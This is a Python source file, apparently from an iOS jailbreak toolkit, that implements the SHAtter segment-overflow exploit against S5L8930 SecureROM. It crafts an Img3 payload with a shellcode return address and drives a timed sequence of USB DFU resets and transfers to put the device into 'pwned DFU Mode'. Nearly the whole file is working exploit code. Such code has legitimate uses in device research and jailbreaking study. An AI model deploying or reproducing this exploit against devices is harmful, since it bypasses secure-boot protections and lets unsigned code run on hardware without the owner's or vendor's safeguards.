# Credit: This file is based on SHAtter exploit (segment overflow) by posixninja and pod2g.

import struct, sys, time
import dfu

def generate_payload():
    shellcode_address = 0x8402F198 + 1
    data = struct.pack('<40sI', '\xF0' * 40, shellcode_address)
    tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
    header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
    with open('bin/SHAtter-shellcode.bin', 'rb') as f:
        shellcode = f.read()
    assert len(shellcode) <= 1024
    return header + tags + shellcode

def exploit():
    print '*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***'

    device = dfu.acquire_device()
    print 'Found:', device.serial_number

    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    if 'CPID:8930' not in device.serial_number:
        print 'ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.'
        sys.exit(1)

    if 'SRTG:[iBoot-574.4]' not in device.serial_number:
        print 'ERROR: CPID is compatible, but serial number string does not match.'
        print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
        sys.exit(1)

    dfu.reset_counters(device)
    dfu.get_data(device, 0x40)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    dfu.reset_counters(device)
    dfu.get_data(device, 0x140)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.send_data(device, generate_payload())
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    failed = 'PWND:[SHAtter]' not in device.serial_number
    dfu.release_device(device)

    if failed:
        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
        sys.exit(1)

    print 'Device is now in pwned DFU Mode.'
